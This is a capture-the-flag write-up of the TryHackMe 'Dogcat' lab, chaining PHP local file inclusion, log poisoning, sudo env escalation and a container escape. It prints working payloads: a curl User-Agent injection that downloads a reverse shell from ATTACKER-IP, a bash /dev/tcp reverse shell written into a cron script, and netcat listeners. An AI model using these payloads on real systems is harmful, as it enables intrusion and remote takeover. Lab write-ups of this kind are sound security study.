# TryHackMe - Dogcat

## Lab Overview

**Dogcat** is a vulnerable PHP application that demonstrates how a simple **Local File Inclusion (LFI)** vulnerability can be chained into **Remote Code Execution (RCE)** through **log poisoning**, followed by **container breakout and privilege escalation**.

Main concepts learned:

- Local File Inclusion (LFI)
- PHP Wrappers
- Source Code Disclosure
- Log Poisoning
- Remote Code Execution (RCE)
- Linux Privilege Escalation
- Container Escape

Source notes: :contentReference[oaicite:0]{index=0}

---

# Initial Enumeration

The application allows users to view dog or cat pictures:

```text
http://10.49.161.161/?view=dog
```

Testing directory traversal:

```text
http://10.49.161.161/?view=dog/../../../../etc/passwd
```

Returned:

```text
Warning: include(dog/../../../../etc/passwd.php)
failed to open stream
```
<img width="1529" height="796" alt="image" src="https://github.com/user-attachments/assets/a7ea2aa1-8130-4b5a-aec9-ee2a705d068c" />

This immediately revealed two important things:

1. User input is passed into `include()`
2. The application automatically appends `.php`

Example vulnerable logic:

```php
include($_GET['view'] . '.php');
```

This confirmed a Local File Inclusion vulnerability.

---

# Understanding PHP Wrappers

PHP provides special stream wrappers that allow developers to interact with files and data streams.

Common wrappers:

```text
php://filter
data://
zip://
expect://
```

For LFI exploitation, the most useful wrapper is:

```text
php://filter
```

It allows reading file contents through various filters before they are processed.

---

# Why Use Base64 Encoding?

Normally:

```php
include("index.php");
```

executes PHP code.

You only see the rendered output.

You do **not** see:

```php
$db_password = "secret";
```

because PHP executes it server-side.

Using:

```text
convert.base64-encode
```

changes the behavior:

```text
Read File
    ↓
Convert To Base64
    ↓
Return Text
```

Instead of executing code, the server returns the file contents encoded as Base64.

This allows source code disclosure.

---

# Reading Source Code

Payload:

```text
/?view=php://filter/convert.base64-encode/resource=dog/../index
```
<img width="1449" height="491" alt="image" src="https://github.com/user-attachments/assets/90683a9f-1114-41ee-b2aa-b7f36fed7f99" />


After decoding the response:

```php
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';

if(isset($_GET['view'])) {
    if(containsStr($_GET['view'], 'dog')
        || containsStr($_GET['view'], 'cat')) {

        include $_GET['view'] . $ext;
    }
}
```

Important discovery:

```php
$ext
```

is fully user-controlled.

---

# Bypassing the `.php` Extension

Since the application appends:

```php
include($_GET['view'] . $ext);
```

we can simply set:

```text
&ext=
```

Result:

```text
include($_GET['view']);
```

Payload:

```text
/?view=php://filter/convert.base64-encode/resource=dog/../../../../etc/passwd&ext=
```
This successfully read:

```text
/etc/passwd
```
<img width="1447" height="878" alt="image" src="https://github.com/user-attachments/assets/2396e455-d511-4a53-9ea5-18952cdcdb79" />
<img width="1633" height="452" alt="image" src="https://github.com/user-attachments/assets/12538475-07f4-4194-9c96-5c86b243323b" />

---

# Reading Apache Logs

After confirming LFI, the next goal was achieving code execution.

Technology fingerprinting suggested Apache.

Common Apache access log location:

```text
/var/log/apache2/access.log
```

Reading it through LFI:

```text
/?view=/dog/../../../../var/log/apache2/access.log&ext=
```
<img width="1466" height="507" alt="image" src="https://github.com/user-attachments/assets/711aa714-39b1-461b-a628-84ff59e5e05c" />
<img width="1618" height="180" alt="image" src="https://github.com/user-attachments/assets/415d22fb-b742-4f21-b155-91ae8cbefaad" />


Successfully displayed request logs.

---

# Log Poisoning Concept

Apache stores request information inside access logs:

```text
IP
URL
Headers
User-Agent
```

Example:

```text
GET / HTTP/1.1
User-Agent: Firefox
```

If PHP code is written into the log file:

```php
<?php system($_GET['cmd']); ?>
```

and that log file is later included through LFI:

```php
include('/var/log/apache2/access.log');
```

PHP interprets the injected code and executes it.

This technique is called **Log Poisoning**.

---

# Testing Header Injection

Verified that custom User-Agent values appeared inside:

```text
access.log
```

This confirmed the log file was writable indirectly through HTTP requests.
<img width="722" height="316" alt="image" src="https://github.com/user-attachments/assets/fb15c523-edde-4387-912b-2e0f4abf9d3c" />
<img width="1897" height="110" alt="image" src="https://github.com/user-attachments/assets/92866a1d-d4e5-4434-b1f1-dc6807d5db8c" />

---

# Achieving Remote Code Execution

Hosted a PHP reverse shell on the attacker machine:

```bash
python3 -m http.server 4443
```
<img width="745" height="200" alt="image" src="https://github.com/user-attachments/assets/6f2242b4-87bf-4094-ae0a-1dccd9007913" />

Injected PHP into Apache logs:

```bash
curl -A "<?php file_put_contents('php-reverse-shell.php', file_get_contents('http://ATTACKER-IP/php-reverse-shell.php')); ?>" \
"http://TARGET/?view=/dog/../../../../var/log/apache2/access.log&ext="
```

What happens:

1. User-Agent is written into access.log
2. LFI includes access.log
3. PHP executes injected payload
4. Payload downloads reverse shell
5. Reverse shell saved to web directory

Effectively:

```text
LFI
 ↓
Log Poisoning
 ↓
PHP Execution
 ↓
File Write
 ↓
RCE
```

---

# Getting a Reverse Shell

Started listener:

```bash
rlwrap nc -lvnp 4444
```

Accessed uploaded shell:

```text
http://TARGET/php-reverse-shell.php
```

Received shell as:
<img width="781" height="214" alt="image" src="https://github.com/user-attachments/assets/904e17ba-1d57-4478-ac6d-a4603bf357b8" />

```text
www-data
```

---

# User Enumeration

Searching for flags:

```bash
find / -name "*flag*" 2>/dev/null
```

Successfully obtained user flag.

---

# Privilege Escalation

Checking sudo permissions:

```bash
sudo -l
```

Output:
<img width="309" height="70" alt="image" src="https://github.com/user-attachments/assets/09729b50-0e2f-4478-9b8d-35b8a9b364b0" />

```text
(root) NOPASSWD: /usr/bin/env
```

### Why Could `sudo -l` Run Without Password?

Because the current user already had permission to execute `sudo -l`.

Many systems allow users to query sudo privileges without requiring authentication.

---

# GTFOBins Privilege Escalation

Found GTFOBins entry for:

```text
env
```

Executed:

```bash
sudo /usr/bin/env /bin/bash
```

Result:

```bash
root@container#
```

Confirmed:

```bash
whoami
root
```
<img width="664" height="244" alt="image" src="https://github.com/user-attachments/assets/8fb458f2-6c26-4bf2-9228-200afc78a3f3" />

Root access achieved inside the container.

---

# Container Escape

While enumerating as root:

```bash
ls -la /opt
```

Found:

```text
/opt/backup.sh
```

Interesting observation:

```text
Writable by current user
```

Contents suggested it was executed automatically.

Modified script:

```bash
echo '#!/bin/bash
bash -i >& /dev/tcp/ATTACKER-IP/4343 0>&1' > /opt/backup.sh
```

Started listener:

```bash
nc -lvnp 4343
```
<img width="664" height="244" alt="image" src="https://github.com/user-attachments/assets/fc8d0166-a7c4-4d63-ad07-d37d8cc94833" />

After the scheduled execution, received another shell.

This allowed breaking out of the original container context and obtaining access to the host environment.

---

# Attack Chain Summary

```text
LFI
 ↓
Source Code Disclosure
 ↓
Extension Bypass
 ↓
Apache Log Discovery
 ↓
Log Poisoning
 ↓
Remote Code Execution
 ↓
Reverse Shell
 ↓
Sudo Misconfiguration
 ↓
Root Inside Container
 ↓
Writable Scheduled Script
 ↓
Container Escape
```

---

# Key Learnings

- LFI is often more dangerous than simple file disclosure.
- PHP wrappers can reveal application source code.
- Base64 encoding prevents PHP execution and exposes raw source.
- Log poisoning can transform LFI into RCE.
- GTFOBins are invaluable during privilege escalation.
- Writable scripts executed by privileged processes are common escalation vectors.
- Containers are not security boundaries when misconfigured.

---

# Security Impact

Successful exploitation resulted in:

- Arbitrary file read
- Source code disclosure
- Remote code execution
- Root access inside container
- Container breakout
- Full system compromise
